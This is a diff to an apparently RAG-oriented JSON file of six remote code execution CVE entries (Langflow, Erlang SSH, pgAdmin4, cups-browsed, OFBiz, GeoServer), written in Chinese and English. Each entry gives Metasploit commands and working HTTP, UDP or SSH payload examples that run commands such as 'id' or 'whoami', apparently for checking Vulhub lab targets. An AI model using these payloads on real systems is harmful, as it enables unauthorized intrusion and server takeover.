@@ -1,3 +1,4 @@
+[
 {
   "rag_summary": "漏洞 CVE-2025-3248 是 Langflow 平台中的未授权远程代码执行漏洞 (RCE)。攻击者可以通过向 /api/v1/validate/code 接口发送包含恶意 Python 代码的 POST 请求来触发该漏洞。该漏洞无需认证即可利用，利用成功后可获得服务器完全控制权限。对应的 Vulhub 环境镜像为 vulhub/langflow:1.2.0，默认运行在 7860 端口。可使用 Metasploit 模块 exploits/multi/http/langflow_unauth_rce_cve_2025_3248 进行验证。",
   "name": "CVE-2025-3248",
@@ -18,9 +19,9 @@
     "command_example": "msfconsole -q -x 'use exploits/multi/http/langflow_unauth_rce_cve_2025_3248; set RHOSTS 127.0.0.1; set RPORT 7860; run; exit'",
     "required_params": ["target_ip", "target_port"],
     "is_auth_required": false,
-    "payload_example": "POST /api/v1/validate/code HTTP/1.1\nHost: target\nContent-Type: application/json\n\n{\"code\": \"import os; os.system('id')\"}"
+    "payload_example": "POST /api/v1/validate/code HTTP/1.1;Host: target;Content-Type: application/json{code: import os; os.system('id')}"
   }
-}
+},
 
 {
   "rag_summary": "漏洞 CVE-2025-32433 是 Erlang/OTP SSH 服务中的未授权远程代码执行漏洞 (RCE)。攻击者可以通过发送特制的 SSH_MSG_CHANNEL_REQUEST 协议包来触发该漏洞。该漏洞无需认证即可利用，利用成功后可获得服务器完全控制权限。对应的 Vulhub 环境镜像为 vulhub/erlang:27.3.2-with-ssh，默认运行在 2222 端口。可使用 Metasploit 模块 exploits/linux/ssh/ssh_erlangotp_rce 进行验证。",
@@ -32,7 +33,7 @@
     "vuln_type": "rce"
   },
   "description": {
-    "exploit_method": "通过发送特制的SSH_MSG_CHANNEL_REQUEST（消息编号94）协议包，利用Erlang/OTP SSH服务端处理缺陷，在未认证阶段执行任意系统命令。具体是构造包含恶意命令的符合RFC 4254定义结构的消息，其中包含"exec"请求及对应的命令字符串。",
+    "exploit_method": "通过发送特制的SSH_MSG_CHANNEL_REQUEST（消息编号94）协议包，利用Erlang/OTP SSH服务端处理缺陷，在未认证阶段执行任意系统命令。具体是构造包含恶意命令的符合RFC 4254定义结构的消息，其中包含exec请求及对应的命令字符串。",
     "exploit_effect": "攻击者可在未进行身份认证的情况下远程执行任意系统命令，例如在目标系统中创建文件等操作，对系统安全性造成严重威胁。"
   },
   "poc_details": {
@@ -44,7 +45,7 @@
     "is_auth_required": false,
     "payload_example": "SSH_MSG_CHANNEL_REQUEST (94) packet with \"exec\" request type and boolean false, containing command string"
   }
-}
+},
 
 {
   "rag_summary": "漏洞 CVE-2025-2945 是 pgAdmin4 中的远程代码执行漏洞 (RCE)。攻击者可以通过向 /sqleditor/query_tool/download 或 /cloud/deploy 接口注入恶意代码来触发该漏洞。该漏洞需要认证才能利用，利用成功后可获得服务器完全控制权限。对应的 Vulhub 环境镜像为 vulhub/pgadmin:9.1，默认运行在 5050 端口。可使用 Metasploit 模块 exploits/multi/http/pgadmin_query_tool_authenticated 进行验证。",
@@ -68,7 +69,7 @@
     "is_auth_required": true,
     "payload_example": "POST /sqleditor/query_tool/download HTTP/1.1\\nContent-Type: application/json\\n\\n{\"sql\": \"SELECT 1\", \"query_commited\": \"import os; os.system('id')\"}"
   }
-}
+},
 
 {
   "rag_summary": "漏洞 CVE-2024-47177 是 Cups-Browsed 中的远程代码执行漏洞 (RCE)。攻击者可以通过向目标发送恶意的 UDP 数据包（包含构造的打印机信息）来触发该漏洞。该漏洞无需认证即可利用，当存在打印任务时恶意命令将被执行。对应的 Vulhub 环境镜像为 vulhub/cups-browsed:2.0.1，默认运行在 631 端口。可使用 Metasploit 模块 exploits/multi/misc/cups_ipp_remote_code_execution 进行验证。",
@@ -92,7 +93,7 @@
     "is_auth_required": false,
     "payload_example": "UDP Packet to port 631: \"0 3 http://<attacker_ip>:<port>/printers/NAME\""
   }
-}
+},
 
 {
   "rag_summary": "漏洞 CVE-2024-38856 是 Apache OFBiz 中的未授权远程代码执行漏洞 (RCE)。攻击者可以通过向 /webtools/control/main/ProgramExport 接口发送包含恶意 Groovy 表达式的请求来触发该漏洞。该漏洞无需认证即可利用，利用成功后可获得服务器完全控制权限。对应的 Vulhub 环境镜像为 vulhub/ofbiz:18.12.14，默认运行在 8443 端口。可使用 Metasploit 模块 exploits/multi/http/apache_ofbiz_forgot_password_directory_traversal 进行验证。",
@@ -116,7 +117,7 @@
     "is_auth_required": false,
     "payload_example": "POST /webtools/control/main/ProgramExport HTTP/1.1\\nContent-Type: application/x-www-form-urlencoded\\n\\ngroovyProgram=throw+new+Exception('whoami'.execute().text);"
   }
-}
+},
 
 {
   "rag_summary": "漏洞 CVE-2024-36401 是 GeoServer 中的未授权远程代码执行漏洞 (RCE)。攻击者可以通过构造恶意的 OGC 请求（如包含恶意 XPath 表达式）来触发该漏洞。该漏洞无需认证即可利用，利用成功后可获得服务器完全控制权限。对应的 Vulhub 环境镜像为 vulhub/geoserver:2.23.2，默认运行在 8080 端口。可使用 Metasploit 模块 exploits/multi/http/geoserver_unauth_rce_cve_2024_36401 进行验证。",
@@ -141,3 +142,4 @@
     "payload_example": "GET /geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch /tmp/success') HTTP/1.1"
   }
 }
+]
